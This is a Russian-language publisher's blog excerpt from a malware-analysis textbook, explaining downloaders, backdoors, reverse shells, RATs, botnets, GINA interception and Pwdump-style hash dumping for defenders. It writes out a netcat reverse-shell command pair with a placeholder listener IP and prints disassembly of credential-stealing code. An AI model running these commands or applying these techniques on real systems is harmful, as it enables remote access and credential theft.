<doc><category auto="true" type="str" verify="true"><![CDATA[Информационная безопасность]]></category><author auto="true" type="str" verify="true"><![CDATA[ph_piter]]></author><title auto="true" type="str" verify="true"><![CDATA[Книга «Вскрытие покажет! Практический анализ вредоносного ПО»]]></title><keywords auto="true" type="list" verify="true"><item type="str"><![CDATA[Информационная безопасность]]></item><item type="str"><![CDATA[Блог компании Издательский дом «Питер»]]></item><item type="str"><![CDATA[Профессиональная литература]]></item></keywords><text auto="true" type="str" verify="true"><![CDATA[Анализ вредоносного ПО напоминает игру в кошки-мышки: никаких правил, ситуация постоянно меняется. Поэтому в данном случае имеет смысл изучать лишь неустаревающие вещи и алгоритмы. Как только перед вами встает задача защитить сеть (или тысячу сетей), вы приступаете к такому анализу, и без этой книги вам попросту не обойтись. Программы для загрузки и запуска ПО Можно выделить два типа часто встречаемых вредоносов, предназначенных для загрузки и запуска ПО. Загрузчики (не путать с системными загрузчиками) просто загружают из Интернета дополнительный вредоносный код и запускают его на локальном компьютере. Они часто распространяются вместе с эксплойтом. Для загрузки и выполнения дополнительного вредоносного ПО они обычно используют два вызова Windows API, идущие один за другим: URLDownloadtoFileA и WinExec. Пусковая программа (launcher) представляет собой исполняемый файл, который устанавливает вредоносные приложения для их скрытого выполнения (сразу или через какое-то время). Пусковые программы часто поставляются с ПО, которое они должны запускать. Мы обсудим их в главе 12. Бэкдоры Бэкдоры — это программы, которые предоставляют злоумышленнику доступ к компьютеру жертвы. Они являются самым обнаруживаемым типом вредоносного ПО, а их размер и набор возможностей может существенно варьироваться. Код бэкдора обычно самодостаточен и не требует загрузки дополнительных зараженных файлов. Бэкдоры взаимодействуют по Интернету множеством различных способов, но передача данных, как правило, происходит по протоколу HTTP через порт 80. HTTP составляет большую часть исходящего сетевого трафика, что дает вредоносу отличную возможность остаться незамеченным на фоне остальной информации. Из главы 14 вы узнаете, как анализировать бэкдоры на уровне пакетов, создавая эффективные сетевые сигнатуры. А пока мы сосредоточимся на высокоуровневом взаимодействии. Бэкдоры поставляются со стандартным набором функций: возможностью манипулировать ключами реестра, подсчитывать отображаемые окна, создавать каталоги, искать файлы и т. д. Чтобы понять, что именно из этого используется бэкдором, можно проверить, какие функции Windows API он импортирует. В приложении А приводится список распространенных функций с описанием того, что они могут сказать о вредоносной программе. Обратная командная оболочка Обратная командная оболочка — это соединение, которое инициирует зараженный компьютер, предоставляя командный доступ злоумышленнику. Это может быть как отдельная вредоносная программа, так и один из компонентов более сложного бэкдора. Находясь в обратной командной оболочке, злоумышленник может выполнять команды так, как будто все это происходит в его локальной системе. Обратная командная оболочка Netcat Программа Netcat, которую мы обсуждали в главе 3, может быть использована для создания командной оболочки, если ее запустить на двух компьютерах. Злоумышленники часто используют ее саму, а также дополняют ей другое вредоносное ПО. Чтобы применить Netcat в таком качестве, удаленная система должна ожидать входящих подключений с помощью следующей команды: nc -l –p 80 Параметр -l переключает Netcat в режим прослушивания, а параметр -p определяет отслеживаемый порт. Далее компьютер жертвы инициирует исходящее соединение и предоставляет свою командную оболочку: nc слушатель_ip 80 -e cmd .exe слушатель_ip 80 — это IP-адрес и порт удаленного узла. Параметр -e позволяет указать программу, которая будет запущена при установлении соединения. Ее стандартные ввод и вывод будут привязаны к сокету (как вы увидите далее, в Windows часто используется cmd.exe). Обратная командная оболочка Windows Злоумышленники используют две простые реализации обратной командной оболочки в Windows на основе cmd.exe: базовую и многопоточную. Базовый метод популярен среди авторов вредоносного ПО, так как его проще реализовать и в целом он работает не хуже многопоточного подхода. Он основан на вызове CreateProcess и изменении структуры STARTUPINFO, которая ему передается. Сначала создается сокет и устанавливается соединение с удаленным сервером. Затем этот сокет привязывается к стандартным потокам (вводу, выводу и потоку ошибок) процесса cmd.exe. CreateProcess запускает cmd.exe в режиме без окна, чтобы скрыть его от жертвы. В главе 7 приводится пример этого приема. Многопоточная версия обратной командной оболочки Windows подразумевает создание сокета, двух каналов и двух потоков выполнения (поэтому вам следует искать вызовы CreateThread и CreatePipe). Этот метод иногда используется авторами вредоносного ПО в рамках стратегии по изменению или кодированию данных, передающихся по сокету. Функцию CreatePipe можно использовать для привязки к каналу считывающего и записывающего концов, таких как стандартный ввод (stdin) и стандартный вывод (stdout). Функция CreateProcess позволяет привязать стандартные потоки к каналу, а не напрямую к сокету. После ее вызова вредонос создаст два потока выполнения: один для чтения из stdin канала и записи в сокет, а другой — для чтения из сокета и записи в stdout канала. Обычно эти потоки выполнения занимаются кодированием данных, о чем мы поговорим в главе 13. С помощью методов обратного проектирования вы можете исследовать ответвления, в которых потоки декодируют пакеты, полученные в ходе зашифрованной сессии. Средства удаленного администрирования Средства удаленного администрирования (remote administration tools, или RAT) используются для управления компьютером или компьютерами по сети. Их часто задействуют в узконаправленных атаках — например, при похищении информации или перемещении от компьютера к компьютеру. На рис. 11.1 показана сетевая структура RAT. Сервер, запущенный в системе жертвы, снабжен вредоносным кодом. Клиент работает удаленно, так как управляющий модуль находится в распоряжении злоумышленника. Серверы сигнализируют клиенту, который их контролирует, чтобы тот инициировал соединение. Взаимодействие в RAT обычно происходит через стандартные порты, такие как 80 или 443. Ботнеты Ботнет — это набор зараженных сетевых узлов (зомби), управляемых централизованно, обычно с помощью сервера, который называют контроллером ботнета. Цель ботнета состоит в заражении как можно большего числа компьютеров и создании на их основе масштабной сети, которая может быть использована как для распространения другого вредоносного ПО или спама, так и для выполнения DDoS-атак (distributed denial-of-service — распределенный отказ в обслуживании). Если все зомби одновременно начнут атаковать определенный сайт, тот может стать недоступным. Сравнение RAT и ботнетов Между ботнетами и удаленными средствами администрирования существует несколько важных различий. Ботнеты известны тем, что заражают и контролируют миллионы узлов. RAT обычно управляют намного меньшим количеством компьютеров. Все участники ботнета управляются одновременно. RAT позволяет распределять ресурсы между разными жертвами, поскольку злоумышленник имеет возможность куда более тесного взаимодействия с зараженными системами. RAT используются в узконаправленных атаках, тогда как ботнеты отличаются своей массовостью. Похищение учетных данных Злоумышленники часто идут на всевозможные ухищрения, чтобы похитить учетные данные. Особенно это относится к трем видам вредоносного ПО. Программы, которые похищают учетные данные пользователя в момент, когда тот входит в систему. Программы, которые копируют информацию, хранящуюся в Windows (пароли, хеши и т. д.), для непосредственного использования или дальнейшей расшифровки. Программы, которые записывают нажатия клавиш. В данном разделе мы рассмотрим каждую из этих разновидностей вредоносного ПО. Перехват GINA В Windows XP для хищения учетных данных используется прием, состоящий в перехвате GINA (graphical identification and authentication — графическая идентификация и аутентификация). Система GINA создавалась для того, чтобы позволить сторонним приложениям адаптировать под себя процесс входа в систему, добавляя поддержку таких технологий, как аппаратная радиочастотная идентификация (radio-frequency identification, RFID) на основе маркеров или смарт-карт. Авторы вредоносного ПО пользуются этой возможностью для загрузки кода, который крадет учетные данные. GINA реализуется в виде DLL под названием msgina.dll и загружается программой Winlogon во время входа в систему. Winlogon также поддерживает сторонние плагины, загружая их перед GINA DLL (как при атаке посредника). Для удобства Windows предоставляет следующую ветвь реестра, где Winlogon может найти и загрузить сторонние DLL: HKLM \ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Winlogon \ GinaDLL Когда-то мы нашли там зараженный файл fsgina.dll, который оказался перехватчиком GINA. На рис. 11.2 показан пример того, как данные для входа в систему попадают к вредоносной библиотеке, проходя от Winlogon к msgina.dll. Вредоносу (fsgina.dll) удается перехватить всю учетную информацию, которую пользователь вводит во время аутентификации. Он может записать ее на диск или передать по сети. Поскольку библиотека fsgina.dll перехватывает поток взаимодействия между Winlogon и GINA, она должна передать его дальше в msgina.dll, чтобы система продолжила нормально функционировать. Для этого вредоносу приходится экспортировать все функции, которые требуются системе GINA, — их насчитывается больше 15, и большинство из них имеют префикс Wlx. Очевидно, что при обнаружении в DLL множества экспортных функций, которые начинаются с Wlx, можно с большой долей вероятности предположить, что это перехватчик GINA. Большинство этих экспортных вызовов обращаются к реальным функциям внутри msgina.dll. В случае с fsgina.dll это относится ко всем функциям, кроме WlxLoggedOutSAS. В листинге 11.1 показан экспорт WlxLoggedOutSAS в fsgina.dll. Листинг 11.1. Экспортная функция WlxLoggedOutSAS в GINA DLL, с помощью которой записываются похищенные учетные данные 100014 A 0 WlxLoggedOutSAS 100014 A 0 push esi 100014 A1 push edi 100014 A2 push offset aWlxloggedout_ 0 ; "WlxLoggedOutSAS" 100014 A7 call Call_msgina_dll_function ( 1 )... 100014 FB push eax ; Args 100014 FC push offset aUSDSPSOpS ; "U: %s D: %s P: %s OP: %s" 10001501 push offset aDRIVERS ; "drivers\tcpudp.sys" 10001503 call Log_To_File ( 2 ) Учетная информация сразу же передается в файл msgina.dll с помощью вызова, обозначенного как Call_msgina_dll_function (1). Эта функция динамически находит и запускает вызов WlxLoggedOutSAS из msgina.dll, который указывается в виде аргумента. Вызов в строке (2) выполняет запись данных. В качестве аргументов он принимает учетную информацию, строку форматирования, с помощью которой эта информация будет выводиться, и имя файла для записи. В итоге сведения о любом успешном входе в систему сохраняются в файл %SystemRoot%\system32\drivers\tcpudp.sys. Этот файл содержит имя пользователя, домен и два пароля — текущий и старый. Сохранение хешей Вредоносное ПО в Windows часто сохраняет системные хеши, чтобы получить доступ к учетным данным. После сохранения злоумышленники пытаются расшифровать эти хеши в автономном режиме или использовать их для атаки типа pass-the-hash. В ходе этой атаки хеши LM и NTLM применяются для удаленной NTLM-аутентификации, что не требует их расшифровки и получения соответствующего пароля. Для сохранения хешей существуют программные пакеты Pwdump и Pass-the-Hash (PSH), которые распространяются бесплатно. Поскольку оба этих инструмента имеют открытый исходный код, на их основе создано множество вредоносного ПО. У большинства антивирусов предусмотрены сигнатуры для стандартных скомпилированных версий этих утилит, поэтому злоумышленники часто пытаются скомпилировать собственные их вариации, чтобы избежать обнаружения. Примеры, приводимые в этой главе, являются разновидностями pwdump и PSH, с которыми мы сталкивались в реальных условиях. Pwdump — это набор программ, которые выводят из диспетчера учетных записей безопасности (security account manager, SAM) хеши в формате LM i NTLM, принадлежащие локальным пользователям. Pwdump внедряет DLL внутрь процесса LSASS (local security authority subsystem service — сервер проверки подлинности локальной системы безопасности), более известного как lsass.exe. О внедрении DLL мы поговорим в главе 12, а пока что вам стоит знать лишь о том, что это прием, посредством которого вредоносное ПО выполняет библиотеки внутри других процессов, пользуясь всеми их привилегиями. Инструменты для сохранения хешей часто атакуют процесс lsass.exe, потому что он обладает достаточными привилегиями и доступом ко многим полезным API-функциям. Стандартная версия Pwdump использует библиотеку lsaext.dll. При внедрении ее в lsass.exe она вызывает функцию GetHash, которая экспортируется из lsaext.dll, чтобы выполнить извлечение хешей. При этом используются недокументированные функции Windows, которые позволят получить порядковые номера всех пользователей в системе и незашифрованные хеши паролей каждого из них. Столкнувшись с вариацией Pwdump, нужно проанализировать ее библиотеки, чтобы понять, как происходит сохранение хешей. Первым делом следует обратить внимание на экспортные функции. Из Pwdump по умолчанию экспортируется вызов GetHash, но злоумышленники могут легко поменять его имя, чтобы сделать его менее узнаваемым. Затем стоит попытаться определить функции, которые применяются в экспортных вызовах. Многие из них могут находиться динамически, поэтому в экспортных вызовах часто встречается многократное использование операции GetProcAddress. В листинге 11.2 показан код экспортной функции GrabHash из DLL одной из версий Pwdump. Поскольку библиотека внедряется в lsass.exe, перед использованием многих символов ей сначала приходится находить их в ручном режиме. Листинг 11.2. Уникальные АPI-вызовы, которые используются экспортной функцией GrabHash в одном из вариантов Pwdump 1000123 F push offset LibFileName ; "samsrv.dll" ( 1 ) 10001244 call esi ; LoadLibraryA 10001248 push offset aAdvapi32_dll_ 0 ; "advapi32.dll" ( 2 )... 10001251 call esi ; LoadLibraryA... 1000125 B push offset ProcName ; "SamIConnect" 10001260 push ebx ; hModule 10001265 call esi ; GetProcAddress... 10001281 push offset aSamrqu ; "SamrQueryInformationUser" 10001286 push ebx ; hModule 1000128 C call esi ; GetProcAddress... 100012 C2 push offset aSamigetpriv ; "SamIGetPrivateData" 100012 C7 push ebx ; hModule 100012 CD call esi ; GetProcAddress... 100012 CF push offset aSystemfuncti ; "SystemFunction025" ( 3 ) 100012 D4 push edi ; hModule 100012 DA call esi ; GetProcAddress 100012 DC push offset aSystemfuni_ 0 ; "SystemFunction027" ( 4 ) 100012 E1 push edi ; hModule 100012 E7 call esi ; GetProcAddress В листинге 11.2 показан код получения дескрипторов библиотек samsrv.dll (1) и advapi32.dll (2) помощью вызова LoadLibrary. Файл samsrv.dll содержит API для простого доступа к SAM, а файл advapi32.dll был найден для доступа к функциям, которые не импортированы в lsass.exe. Динамическая библиотека данной вариации Pwdump использует дескрипторы этих библиотек для поиска множества функций. Пять самых важных из них показаны в листинге (обратите внимание на вызовы GetProcAddress и их аргументы). Из samsrv.dll импортируются такие интересные вызовы, как SamIConnect, SamrQueryInformationUser и SamIGetPrivateData. Вызов SamIConnect впоследствии используется для подключения к SAM, после чего для каждого пользователя в системе вызывается функция SamrQueryInformationUser. Хеши извлекаются с использованием вызова SamIGetPrivateData, а затем расшифровываются с помощью функций SystemFunction025 и SystemFunction027, импортированных из advapi32.dll (строки (2) и (3)). Ни одна из API-функций в этом листинге не описана в официальной документации. PSH Toolkit содержит программы, которые создают дампы хешей. Самый популярный из этих дампов известен под названием whosthere-alt. В нем хранится содержимое SAM, полученное путем внедрения DLL в lsass.exe. При этом, если сравнивать с Pwdump, используется совершенно другой набор API-функций. В листинге 11.3 показан код версии whosthere-alt, которая экспортирует функцию с именем TestDump. Листинг 11.3. Уникальные API-вызовы, которые используются экспортной функцией TestDump версии whosthere-alt 10001119 push offset LibFileName ; "secur32.dll"1000111E call ds:LoadLibraryA 10001130 push offset ProcName ; "LsaEnumerateLogonSessions"10001135 push esi ; hModule10001136 call ds:GetProcAddress ( 1 )... 10001670 call ds:GetSystemDirectoryA 10001676 mov edi, offset aMsv1_0_dll ; \\msv1_0.dll...100016A6 push eax ; path to msv1_0.dll100016A9 call ds:GetModuleHandleA ( 2 ) Поскольку данная библиотека внедряется в lsass.exe, ее функция TestDump создает дамп хеша. Она динамически загружает файл secur32.dll и находит в нем вызов LsaEnumerateLogonSessions (1), чтобы получить список локальных уникальных идентификаторов (locally unique identifiers, LUID). В этом списке содержатся имена и домены, которые указывались при каждом входе в систему. Библиотека перебирает их, чтобы получить доступ к учетной информации. Для этого с помощью вызова GetModuleHandle (2) она ищет внутри msv1_0.dll неэкспортированную функцию, NlpGetPrimaryCredential, которая позволяет создавать дампы хешей NT и LM. Об авторах Майкл Сикорски — специалист по безопасности в компании Mandiant. Он занимается анализом вредоносного программного обеспечения в рамках расследования инцидентов и является консультантом правительства США в области информационной безопасности. Майкл разработал серию курсов по анализу вредоносного программного обеспечения (ПО) и преподает их для разнообразной аудитории, включая ФБР и Black Hat. До Mandiant он был сотрудником лаборатории Линкольна в Массачусетском технологическом институте и проводил исследования в области топологии пассивных сетей и проникающего тестирования. Кроме того, Майкл прошел трехгодичную междисциплинарную программу обучения по системам и сетям в АНБ. Во время обучения он участвовал в исследовании методик обратного проектирования и получил несколько наград в области сетевого анализа. Эндрю Хониг занимает должность эксперта по обеспечению информационной безопасности в Министерстве обороны США. Он преподает анализ программного обеспечения, обратное проектирование и программирование для операционной системы (ОС) Windows в Национальной школе криптографии, являясь при этом сертифицированным специалистом по безопасности информационных систем. На счету Эндрю несколько эксплойтов нулевого дня для средств виртуализации VMware, а также инструменты для обнаружения инновационного вредоносного ПО, включая зараженные модули ядра. Имея за плечами десятилетний опыт аналитика в области компьютерной безопасности, он по праву считается экспертом в анализе и толковании как вредоносных, так и обычных программ. » Более подробно с книгой можно ознакомиться на сайте издательства » Оглавление » Отрывок Для Хаброжителей скидка 20% по купону — Вскрытие покажет]]></text></doc>